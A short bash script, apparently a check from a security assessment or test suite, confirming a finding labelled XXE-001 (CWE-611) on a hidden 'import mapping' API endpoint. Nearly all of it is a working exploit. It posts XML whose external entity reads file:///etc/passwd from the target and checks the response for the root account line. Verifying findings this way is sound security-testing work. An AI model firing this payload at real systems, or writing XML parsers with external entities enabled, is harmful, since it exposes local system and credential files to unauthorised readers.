#!/usr/bin/env bash
# XXE-001 (CWE-611): the hidden "import mapping" endpoint parses caller XML with
# external entities enabled, so a SYSTEM entity reads a local file and the value
# comes back in the response. Reachable only via the dashboard's Advanced panel.
set -eu; . "$(dirname "$0")/_lib.sh"
XML='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><mapping><field>&xxe;</field></mapping>'
curl -s -X POST "$TARGET/api/tools/import-mapping" -H 'content-type: application/xml' --data-binary "$XML" \
  | grep -q 'root:.*:0:0:'
